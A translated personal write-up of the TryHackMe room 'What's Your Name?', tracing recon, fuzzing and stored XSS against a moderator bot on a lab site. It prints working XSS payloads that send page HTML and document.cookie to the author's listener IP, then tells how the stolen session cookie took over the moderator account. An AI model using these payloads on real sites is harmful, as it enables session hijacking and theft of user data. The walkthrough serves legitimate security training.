> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# What's Your Name?

![Screenshot](img/Pasted%20image%2020260501201142.png)

https://tryhackme.com/room/whatsyourname

![Screenshot](img/Pasted%20image%2020260501201201.png)

## Recon

I'm assuming I'll only need to work with the website, which is probably on port 80, but I might as well scan all ports anyway.

Find port 80 and 22 open as expected, but also 8081 - what's hiding there?

Nmap says the following:

![Screenshot](img/Pasted%20image%2020260501202342.png)

![Screenshot](img/Pasted%20image%2020260501202441.png)

So also something web-related. Time to open the browser.
## The Web

On port 80, a "brand new era of social networking" is presented. Oh boy.

![Screenshot](img/Pasted%20image%2020260501202604.png)

There's also a chance to register:

![Screenshot](img/Pasted%20image%2020260501202640.png)

If I try to point to the same domain but on port 8081, I can't reach it.

What does curl say if I run it against the IP and port 8081?

![Screenshot](img/Pasted%20image%2020260501202916.png)

Ah, only a comment. That's why I didn't see anything... Now I'm curious what `login.php` actually looks like. I'll probably come back to that.

Time to register an account!
## Registration

![Screenshot](img/Pasted%20image%2020260501203213.png)

After clicking *Register* I was redirected here:

![Screenshot](img/Pasted%20image%2020260501203307.png)

Strange - a login page that says I need to visit another login page?

If I try to log in where I'm standing, I get the following:

![Screenshot](img/Pasted%20image%2020260501203349.png)

So let's visit `login.worldwap.thm`...

Doesn't quite work. Add the subdomain to `/etc/hosts` and then it seems to work. Looks like I reach the site on port 8081. Is my user verified now?

Nope, same message as on the first login page. Hm.

A bit of fuzzing is probably in order...
## Fuzz fuzz

Found a bunch of stuff, among other things that directory listing was enabled on `/public/`

![Screenshot](img/Pasted%20image%2020260501204403.png)

`html/` only contains index (since I land on the front page when I click into it), but `js/` contains some good stuff. Among other things `login.js`

![Screenshot](img/Pasted%20image%2020260501204701.png)

Without having analyzed the code super closely, it looks like you can be redirected to a dashboard or admin panel based on the value of `data.role`. I can also see the path to the login API, which is found under `/api/login.php`.

I actually saw `/api` in my fuzz

![Screenshot](img/Pasted%20image%2020260501205422.png)

But I probably can't open the path and see what's there. Exactly, doing a GET there doesn't work

![Screenshot](img/Pasted%20image%2020260501205548.png)

Using curl to try to log in. Didn't work with `admin:admin` so I'll have to test with creds from my new user:

![Screenshot](img/Pasted%20image%2020260501210052.png)

But still get `{"error":"User not verified."}` as the response...

Time to inspect stuff in Burp.
## Burp

Exactly what does the POST request look like when I registered my user?

![Screenshot](img/Pasted%20image%2020260501210614.png)

And the response

![Screenshot](img/Pasted%20image%2020260501210633.png)

So no hidden fields about verified status...

The POST request does have an interesting header, `X-THM-API-Key`

Looks like an md5 hash, and a quick trip to crackstation gave the answer:

![Screenshot](img/Pasted%20image%2020260501211431.png)

`johncena` - a user perhaps?

## API

I'm thinking my best opening right now is that there's an API and that I have an API key. Maybe calls there can give me more info about how I actually get in. Did a targeted fuzz to `/api` with `.php` as the extension using ffuf and got the following response:

![Screenshot](img/Pasted%20image%2020260501211628.png)

Time to hammer away a bit with curl against these endpoints and include the API key with each call. Starting with config, setup and mod :)

`Config` responded empty.

`Mod` responded with "Not logged in"

Same thing with `posts`.

`Setup` responded with "Setup successful". What on earth does that mean? :D

I do notice a slightly interesting thing though. When I've registered a user and run a POST request with curl against `/api/login.php` I get "user not verified" as the response. If I then run a request to `api/setup.php` and a new request to try to log in, I get "Invalid username or password". Somehow `api/setup.php` seems to wipe out my created users.

Check it out:

![Screenshot](img/Pasted%20image%2020260501234739.png)

![Screenshot](img/Pasted%20image%2020260501234802.png)

![Screenshot](img/Pasted%20image%2020260501234818.png)

![Screenshot](img/Pasted%20image%2020260501234829.png)
## Enumerate users

There's evidently already a user with the name `admin`. Because it wasn't possible to register that again.

![Screenshot](img/Pasted%20image%2020260501212757.png)

Tried with `moderator`, and I was allowed to register that.

How about `johncena`? I was allowed to register that too.

## What did the module cover?

The module is about Advanced Client-Side Attacks. The most recent thing I read about and labbed with was CORS and Same-Origin Policy.

So I capture the GET request to `login.worldwap.thm` in Burp, send it to Repeater and try adding an Origin header. Starting with `null`

![Screenshot](img/Pasted%20image%2020260502000529.png)

Still get the same response though. Also test with `Origin: login.worldwap.thm` and `worldwap.thm` but that results in the same.

Instead I review the POST request sent to `/api/login.php` when on the page `/public/html/login.php`

![Screenshot](img/Pasted%20image%2020260502103519.png)

Maybe you can do something with the Origin and/or Referer headers here?

Testing a few different things but stuck in the same loop of failing to verify the user...
## Fuzzing against login.worldwap.thm

Maybe there are some exciting endpoints on the subdomain?

![Screenshot](img/Pasted%20image%2020260502110135.png)

A few images that look like typical content for a social platform. But otherwise not much more than that. Nothing I can see I can directly take advantage of.

I do think it must have something to do with CORS and Same-Origin Policy. But how...
## Breakthrough?

This fuzzing thing, why haven't I seen this endpoint before?

![Screenshot](img/Pasted%20image%2020260502113914.png)

I get this though when I supply `hello:hello`

![Screenshot](img/Pasted%20image%2020260502114200.png)

Ran a new fuzz and really did find something more interesting on `login.worldwap.thm`

![Screenshot](img/Pasted%20image%2020260502114827.png)

## XSS Payload at registration

I don't seem to find a way to get myself verified. When I read the registration form more carefully, it says that a moderator will review my registration - maybe that's the one who manually marks me as verified?

![Screenshot](img/Pasted%20image%2020260502151347.png)

So I test setting up a listener and sending an XSS payload at registration.


![Screenshot](img/Pasted%20image%2020260502151237.png)

I choose to put it in the name field since I'm guessing it gets printed out in the DOM.

I go back to my listener and see the following:

![Screenshot](img/Pasted%20image%2020260502151451.png)

Bingo! What does this look like if I decode it from HTML?

```html
GET /probe?html=<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">WorldWAP</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                                        <li class="nav-item">
                        <a class="nav-link" href="dashboard.php">Dashboard</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="logout.php">Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
    <h2 class="text-center">Manage Users</h2>
    <!-- <div id="users" class="mt-5"></div> -->

    <div id="users2" class="mt-5">
        <table class="table">
            <thead>
            <tr>
                <th>Username</th>
                <th>Email</th>
                <th>Name</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
                        <tr>
                <td>hej</td>
                <td>hej</td>
                <td>hej</td>
                <td>
                <a href="../../../api/mod_update.php?userId=34">Activate</a>
                </td>
            </tr>
                        <tr>
                <td>max</td>
                <td>max</td>
                <td><img src="x" onerror="fetch('http://192.168.147.205:4444/probe?html='+encodeURIComponent(document.body.outerHTML.slice(0,4000)))"></td>
                <td>
                <a href="../../../api/mod_update.php?userId=35">Activate</a>
                </td>
            </tr>
                        </tbody>
        </table>
    </div>

    <script src="../js/slim.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>

</div></body> HTTP/1.1" 404 -
```

I can read out my `userId`, which in this case is 35 (for my new user `max`, 34 for my old `hej`). But the account is still not activated, so I want to create a new user and update my payload to the following:

`<img src=x onerror="fetch(this.closest('tr').querySelector('a[href*=mod_update]').href).then(()=>fetch('http://192.168.147.205:5555/done'))">`

Changing port so I avoid noise from my old payload :)

Got the following response:

![Screenshot](img/Pasted%20image%2020260502153045.png)

But still get "user not verified". But it feels close now!

And now, a while into trying different payloads, I get no response from the server at all. That is, to my listener. Also restarted the machine and my VPN connection. Despite that I can't run my initial payload, regardless of user, so it feels like I'm stuck. Time for a break.

## After the break

Realized pretty quickly, once I'd fueled up on coffee and fruit, that it was probably some cache thing in the browser messing it up. When I tried to send off my payload earlier (i.e. to confirm), the machine had changed IP. Maybe the browser simply loaded a cached version that pointed to the wrong IP.

Fresh start, cleared all cache and off with my initial payload - it worked. Phew...

But I'm still stuck in the same rut, enough for today.

## The penny dropped. Or?

After closing down the project for the day and going for a run, I later stood in the shower. There I started going through what I had done and what possible paths forward there were.

What had I tried to do? Through an XSS payload I've tried to get the moderator to verify my account. But what is it I actually want to achieve?

To get the first flag I need to access the moderator account.

Since I manage to send an XSS payload to the presumed moderator, couldn't I instead send a payload that hijacks the session so I can take it over?

Then I should be able to access the moderator's account! Time to put my idea into practice.

This should work, provided the site's cookies don't have the HttpOnly flag set. I haven't had a way to check this while logged in (since I haven't managed to verify my users...), but just from browsing around the site, this flag isn't set.
## New payload

It looks like this:

`<img src=x onerror="fetch('http://xx.xx.xx.xx:4444/?c='+encodeURIComponent(document.cookie))">`

Save it to a file, start my listener and send a payload in the name field.

![Screenshot](img/Pasted%20image%2020260503140548.png)

Unfortunately the response looks like this:

![Screenshot](img/Pasted%20image%2020260503140759.png)

Could I have written something wrong in my payload? Yes, I had. I need to remove the HTML tags. Third time's the charm.

Edited `p.js` and wait for the next round when the "moderator" executes my payload, and voilà:

![Screenshot](img/Pasted%20image%2020260503141238.png)

Decoded the response, opened devtools and inserted it as my own PHPSESSID cookie, refreshed the browser and:

![Screenshot](img/Pasted%20image%2020260503141507.png)

The big mistake last night was probably that I locked myself into the idea that my payload should make the moderator verify my user. A bit of a break and some distance got me thinking along different lines.

Then navigated to `login.worldwap.thm/login.php` and got to see both a slick dashboard and a flag!

<details>
  <summary><b>Click here to see the flag</b></summary>

  ![Screenshot](img/Pasted%20image%2020260503142049.png)
</details>

## Next flag

I'll get that once I have access to the admin panel. Time to do some recon here in my new environment to see what I can find. But I suspect I'm somehow supposed to exploit what I found in the JS file `login.js`

![Screenshot](img/Pasted%20image%2020260503142614.png)

Probably need to set the admin role on a user first, somehow.

Here's what the left menu looks like, no access :(

![Screenshot](img/Pasted%20image%2020260503144731.png)

Tried changing password. You don't seem to need to provide your old password, but:

![Screenshot](img/Pasted%20image%2020260503145030.png)

What I do have access to, though, is a chat, and there I can chat with admin, muhaha!

![Screenshot](img/Pasted%20image%2020260503145122.png)

Tested sending a few messages - the bot doesn't respond.

Sent `<img src=x>` which rendered a broken image - innerHTML is being used so the chat function is guaranteed to be the next attack path.

![Screenshot](img/Pasted%20image%2020260503145955.png)

Take a look at the JS files I found earlier and navigate to `worldwap.thm/api/mod.php` and find the user I registered:

![Screenshot](img/Pasted%20image%2020260503150447.png)

Now that I'm `moderator` I get access. I'm getting curious about trying to change status to 1 - wonder if that makes me "verified"? Whether it also brings me closer to the admin flag, I'm not really sure.

Went to `mod_update.php`

![Screenshot](img/Pasted%20image%2020260503150803.png)

Added the correct `userId`

![Screenshot](img/Pasted%20image%2020260503150835.png)

When I went back to confirm the change my user was gone, maybe that means I succeeded.

![Screenshot](img/Pasted%20image%2020260503150914.png)

Test logging in with the user `max` in another browser.

Yey!

![Screenshot](img/Pasted%20image%2020260503151038.png)

Well, at least I solved that mystery :D But focus on the admin flag now.

Should I be so bold as to try the same trick against the admin bot? Getting it to send its session cookie? Worth a try, even though I think it should be a bit different.

It doesn't quite work as I expected, my listener catches nothing.

`mod_update.php` exists, could `admin_update.php` exist? Nope...

![Screenshot](img/Pasted%20image%2020260503153346.png)

Run the following in the browser console in an attempt to find out what role I have.

```js
fetch('http://worldwap.thm/api/login.php', {
  method: 'POST', 
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username: 'max', password: 'yourpassword'})
}).then(r=>r.json()).then(console.log)
```

Got the following response when I did that from `login.worldwap.thm/chat.php`

![Screenshot](img/Pasted%20image%2020260503155121.png)

Time to put on my reading glasses: CORS policy says I'm not allowed to make this fetch from here. Navigate to `worldwap.thm` instead and try again.

![Screenshot](img/Pasted%20image%2020260503155321.png)

`max` is `user`, and what `moderator` is I can't find out because I don't know the password...
## New fuzz

Doing a new, bigger fuzz against `/api` since I'm not quite sure about this chat thing... Find a few new endpoints:

![Screenshot](img/Pasted%20image%2020260503161851.png)

OMG! Made a curl request against `/api/posts.php` and found the following goldmine!

![Screenshot](img/Pasted%20image%2020260503161757.png)

But wait, what? I can see that post when logged in both as `moderator` and as `max`. This is confusing me. I clearly have a screenshot of when I'm logged in as `moderator`, and the post isn't visible there :D So it must be something the bot added at a later stage... Time to dig.

Hm, and now, without knowing exactly what I did, I got the last flag...

<details>
  <summary><b>Click here to see the flag</b></summary>

  ![Screenshot](img/Pasted%20image%2020260503163037.png)
</details>

The only thing I did was try to find the right endpoint for `/4dm1n0p3r4t10nS` by sending various curl requests. When I just kept getting 404 on different plausible paths on `worldwap.thm`, I switched over to `login.worldwap.thm`. Wanted to navigate to the front page there to see a plausible path, and suddenly the flag was printed out.

I'll probably have to redo this room soon to try to figure out the logic behind how I "pwned" admin :D And maybe take a look at a writeup. Happy hacking!
